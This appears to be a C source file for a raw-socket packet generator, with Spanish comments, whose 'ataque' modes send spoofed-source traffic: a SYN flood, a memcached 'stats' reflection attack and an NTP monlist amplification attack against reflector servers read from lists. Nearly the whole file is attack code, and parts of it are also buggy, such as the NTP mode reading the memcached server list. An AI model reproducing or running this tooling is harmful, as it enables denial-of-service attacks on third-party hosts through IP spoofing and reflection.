#include <stdio.h>
#include <string.h>
#include <sys/socket.h>
#include <stdlib.h>
#include <errno.h>
#include <netinet/tcp.h>	//tcp header
#include <netinet/in.h>
#include <arpa/inet.h>
#include <net/if.h>
#include <netinet/ip.h>
#include <netinet/udp.h>
#include <netinet/ether.h>
#include <linux/if_packet.h>
#include <unistd.h>
#include "./includes/udp.h"
#include "./includes/tcp.h"


int main(int argc, char *argv[]){

	char *ip_addr, *subnet_mask, *protocolo, *puerto, *destino;
    int j;

    for (j = 1; j < argc; j+=2) {
        if (strcmp(argv[j], "-src") == 0) {
			if (j + 1 < argc) {
				printf("%d", strncmp(argv[j+1], "-", 1));
				if(strncmp(argv[j+1], "-", 1)){
					ip_addr = argv[j + 1];
				} else {
					printf("Error: -src necesita un argumento.\n");
				}
            } else {
                printf("Error: -src necesita un argumento.\n");
                return 1;
            }
        } else if (strcmp(argv[j], "-m") == 0) {
            if (j + 1 < argc) {
				if(strncmp(argv[j+1], "-", 1)){
					subnet_mask = argv[j + 1];
				} else {
					printf("Error: -m necesita un argumento.\n");
				}
            } else {
                printf("Error: -m necesita un argumento.\n");
                return 1;
            }
        } else if (strcmp(argv[j], "-a") == 0) {
            if (j + 1 < argc) {
				if(strncmp(argv[j+1], "-", 1)){
					protocolo = argv[j + 1];
				} else {
					printf("Error: -a necesita un argumento.\n");
				}
            } else {
                printf("Error: -a necesita un argumento.\n");
                return 1;
            }
        } else if (strcmp(argv[j], "-p") == 0) {
            if (j + 1 < argc) {
				if(strncmp(argv[j+1], "-", 1)){
					puerto = argv[j + 1];
				} else {
					printf("Error: -p necesita un argumento.\n");
				}
            } else {
                printf("Error: -p necesita un argumento.\n");
                return 1;
            }
        } else if (strcmp(argv[j], "-dst") == 0) {
            if (j + 1 < argc) {
				if(strncmp(argv[j+1], "-", 1)){
					destino = argv[j + 1];
				} else {
					printf("Error: -dst necesita un argumento.\n");
				}
            } else {
                printf("Error: -dst necesita un argumento.\n");
                return 1;
            }
        } else {
            fprintf(stderr, "Packet generator usage: sudo %s -dst <dest_addr> -src <src_addr> -m <subnet_mask> -p <dest_port> -a <ataque>\n", argv[0]);
        	return 1;
        }
    }

    struct in_addr addr;
    struct in_addr mask;
    struct in_addr net_addr;
    struct in_addr broadcast_addr;
    uint32_t i, num_addrs;

    inet_pton(AF_INET, ip_addr, &addr);
    inet_pton(AF_INET, subnet_mask, &mask);

    net_addr.s_addr = addr.s_addr & mask.s_addr;
    broadcast_addr.s_addr = net_addr.s_addr | ~mask.s_addr;

    num_addrs = ntohl(broadcast_addr.s_addr) - ntohl(net_addr.s_addr) + 1;

	int sockfd = 0;

    //Creamos un socket RAW indica que no se generen los headers del protocolo ni el de ip
	/*if(strcmp(protocolo, "udp") == 0 || strcmp(protocolo, "memcached") == 0){
		sockfd = socket (PF_INET, SOCK_RAW, IPPROTO_RAW);
	} else if((strcmp(protocolo, "tcp") == 0) || (strcmp(protocolo, "syn_flood") == 0)){
		sockfd = socket (PF_INET, SOCK_RAW, IPPROTO_RAW);
	}*/

	sockfd = socket(PF_INET, SOCK_RAW, IPPROTO_RAW);

    if(sockfd == -1){
        perror("Ha habido un problema al crear el socket");
        exit(1);
    }

	//IP_HDRINCL indicamos al kernel que los headers se incluyen en el paquete
	/*int one = 1;
	const int *val = &one;
	
	if (setsockopt (sockfd, IPPROTO_IP, IP_HDRINCL, val, sizeof (one)) < 0)
	{
		perror("Error setting IP_HDRINCL");
		exit(0);
	}*/

    for(i = 0; i < num_addrs; i++){

        struct in_addr curr_addr;
        curr_addr.s_addr = ntohl(net_addr.s_addr) + i;
        struct in_addr aux;
        aux.s_addr = htonl(curr_addr.s_addr);
        char *addr_src = inet_ntoa(aux);


        /*struct in_addr curr_addr;
        curr_addr.s_addr = ntohl(net_addr.s_addr) + i;*/

		if(strcmp(protocolo, "udp") == 0){
			// direccion IP de destino
			struct sockaddr_in daddr;
			if(host_addr(&daddr, destino, atoi(puerto)) == 1){
				return 1;
			}

			// direccion IP de origen
			struct sockaddr_in saddr;
			if(host_addr(&saddr, addr_src, rand() % 65535) == 1){
				return 1;
			}

			char* datagram;
			int datagram_len;
			udp_datagram(&saddr, &daddr, &datagram, &datagram_len, "Paquete custom");
			
			if(sendto (sockfd, datagram, datagram_len ,	0, (struct sockaddr*)&daddr, sizeof(struct sockaddr)) < 0)
			{
				perror("No se ha podido enviar el datagrama");
			} else {
				printf ("Datagrama enviado. Tamaño : %d \n" , datagram_len);
			}
		} else if((strcmp(protocolo, "tcp") == 0)){
			// direccion IP de destino
			struct sockaddr_in daddr;
			if(host_addr(&daddr, destino, atoi(puerto)) == 1){
				return 1;
			}

			// direccion IP de origen
			struct sockaddr_in saddr;
			if(host_addr(&saddr, addr_src, rand() % 65535) == 1){
				return 1;
			}

			char* packet;
			int packet_len;
			tcp_syn_packet(&saddr, &daddr, &packet, &packet_len);

			if (sendto(sockfd, packet, packet_len, 0, (struct sockaddr*)&daddr, sizeof(struct sockaddr)) < 0)
			{
				perror("No se ha podido enviar el paquete");
			} else {
				// receive SYN-ACK
				char recvbuf[DATAGRAM_LEN];
				int received = receive_from(sockfd, recvbuf, sizeof(recvbuf), &saddr);
				if (received <= 0)
				{
					printf("receive_from() failed\n");
				}
				else
				{
					printf("successfully received %d bytes SYN-ACK!\n", received);
				}

				// read sequence number to acknowledge in next packet
				uint32_t seq_num, ack_num;
				read_seq_and_ack(recvbuf, &seq_num, &ack_num);
				int new_seq_num = seq_num + 1;

				// send ACK
				// previous seq number is used as ack number and vica vera
				int sent;
				create_ack_packet(&saddr, &daddr, ack_num, new_seq_num, &packet, &packet_len);
				if ((sent = sendto(sockfd, packet, packet_len, 0, (struct sockaddr*)&daddr, sizeof(struct sockaddr))) == -1)
				{
					printf("sendto() failed\n");
				}
				else
				{
					printf("successfully sent %d bytes ACK!\n", sent);
				}
				close(sockfd);
			}
		} else if((strcmp(protocolo, "syn_flood") == 0)){
			syn_flood(sockfd, destino, ip_addr, atoi(puerto));
		} else if((strcmp(protocolo, "memcached") == 0)){
			FILE* mem_servers = fopen("./memcached/memcached-servers.txt", "r");
			if (mem_servers == NULL) {
				printf("Failed to open the file.\n");
				return 1;
			}

			char linea[256];
			while (fgets(linea, sizeof(linea), mem_servers) != NULL) {

				size_t len = strlen(linea);
				if (len > 0 && linea[len - 1] == '\n') {
					linea[len - 1] = '\0';
				}

				// direccion IP de destino
				struct sockaddr_in daddr;
				if(host_addr(&daddr, linea, 11211) == 1){
					return 1;
				}

				// direccion IP de origen
				struct sockaddr_in saddr;
				if(host_addr(&saddr, linea, 53) == 1){
					return 1;
				}

				char* datagram;
				int datagram_len;
				udp_datagram(&saddr, &daddr, &datagram, &datagram_len, "\x00\x00\x00\x00\x00\x01\x00\x00stats\r\n");
				
				if(sendto (sockfd, datagram, datagram_len ,	0, (struct sockaddr*)&daddr, sizeof(struct sockaddr)) < 0)
				{
					perror("No se ha podido enviar el datagrama");
				} else {
					printf ("Datagrama enviado. Tamaño : %d \n" , datagram_len);
				}
			}

			fclose(mem_servers);
		} else if((strcmp(protocolo, "ntp") == 0)){
			FILE* mem_servers = fopen("./listas/memcached-servers.txt", "r");
			if (mem_servers == NULL) {
				printf("Failed to open the file.\n");
				return 1;
			}

			char linea[256];
			while (fgets(linea, sizeof(linea), mem_servers) != NULL) {

				size_t len = strlen(linea);
				if (len > 0 && linea[len - 1] == '\n') {
					linea[len - 1] = '\0';
				}

				// direccion IP de destino
				struct sockaddr_in daddr;
				if(host_addr(&daddr, linea, 123) == 1){
					return 1;
				}

				// direccion IP de origen
				struct sockaddr_in saddr;
				if(host_addr(&saddr, addr_src, 53) == 1){
					return 1;
				}

				// monlist
				char ntp[8];
				ntp[0] = 0x17;
				ntp[1] = 0x00;
				ntp[2] = 0x03;
				ntp[3] = 0x2A;
				ntp[4] = 0x00;
				ntp[5] = 0x00;
				ntp[6] = 0x00;
				ntp[7] = 0x00;

				char* datagram;
				int datagram_len;
				udp_datagram(&saddr, &daddr, &datagram, &datagram_len, ntp);
				
				if(sendto (sockfd, datagram, datagram_len ,	0, (struct sockaddr*)&daddr, sizeof(struct sockaddr)) < 0)
				{
					perror("No se ha podido enviar el datagrama");
				} else {
					printf ("Datagrama enviado. Tamaño : %d \n" , datagram_len);
				}
			}

			fclose(mem_servers);
		}
        sleep(1);
    }
}